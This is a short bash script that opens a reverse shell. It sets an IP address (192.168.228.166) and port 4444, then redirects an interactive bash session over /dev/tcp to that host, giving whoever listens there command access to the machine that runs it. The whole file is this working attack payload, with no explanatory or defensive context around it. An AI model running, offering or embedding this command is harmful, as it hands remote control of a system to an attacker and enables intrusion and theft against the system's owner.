#!/bin/bash

IP="192.168.228.166"
PORT="4444"

bash -i >& /dev/tcp/$IP/$PORT 0>&1
